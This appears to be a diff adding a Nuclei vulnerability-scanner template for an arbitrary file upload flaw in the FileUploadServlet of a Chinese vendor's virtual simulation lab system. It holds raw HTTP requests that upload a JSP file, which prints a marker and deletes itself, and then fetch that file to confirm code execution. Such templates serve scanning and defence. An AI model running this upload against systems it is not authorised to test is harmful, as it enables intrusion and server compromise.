@@ -1,0 +1,47 @@
+id: qintong-FileUploadServlet-upload
+info:
+  name: 北京润尼尔科技股份有限公司虚拟仿真实验室系统FileUploadServlet存在任意文件上传
+  author: apple
+  severity: critical
+  description: 北京润尼尔科技股份有限公司虚拟仿真实验室系统FileUploadServlet存在任意文件上传
+  reference:
+    - https://
+  tags: tags
+
+variables:
+  filename: "{{rand_base(6)}}"   
+http:
+  - raw:
+      - |
+        POST /chatroom/FileUploadServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=D608C8AF5AC63FB5DA57B858CFC42B42
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGIc4ig8R
+        Content-Length: 184
+
+        ------WebKitFormBoundaryGIc4ig8R
+        Content-Disposition: form-data; name="aaa"; filename="{{filename}}.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.println("whoisceshi");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryGIc4ig8R--
+      - |+
+        GET /chatroom/uploadFile/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
